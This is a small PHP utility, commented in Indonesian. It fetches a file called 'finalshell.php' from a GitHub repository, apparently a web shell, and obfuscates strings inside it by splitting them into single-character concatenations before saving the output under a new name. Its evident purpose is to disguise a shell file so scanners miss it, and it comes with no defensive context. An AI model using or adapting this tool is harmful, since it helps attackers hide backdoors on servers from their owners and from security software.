<?php
// URL file PHP di GitHub
$githubFile = 'https://raw.githubusercontent.com/sundapridee/sunda/refs/heads/main/finalshell.php';

// File hasil encode
$outputFile = 'encoded_github.php';

// Daftar URL atau string yang ingin dipecah (bisa sama atau berbeda dengan file URL)
$urlsToEncode = [
    $githubFile, // contoh langsung encode file yang sama
    // Tambahkan URL lain jika perlu
];

// Ambil isi file dari GitHub
$contents = file_get_contents($githubFile);
if ($contents === false) {
    die("Gagal mengambil file dari GitHub.\n");
}

// Fungsi untuk mengubah string menjadi format 'a'.'b'.'c'
function explode_string($str) {
    $chars = str_split($str);
    $result = "";
    foreach ($chars as $c) {
        $result .= "'$c'.";
    }
    return rtrim($result, '.'); // hapus titik terakhir
}

// Ganti URL atau string tertentu saja
foreach ($urlsToEncode as $url) {
    $contents = str_replace($url, explode_string($url), $contents);
}

// Simpan hasil
file_put_contents($outputFile, $contents);

echo "Selesai! File GitHub telah diambil dan di-encode.\nFile tersimpan di $outputFile\n";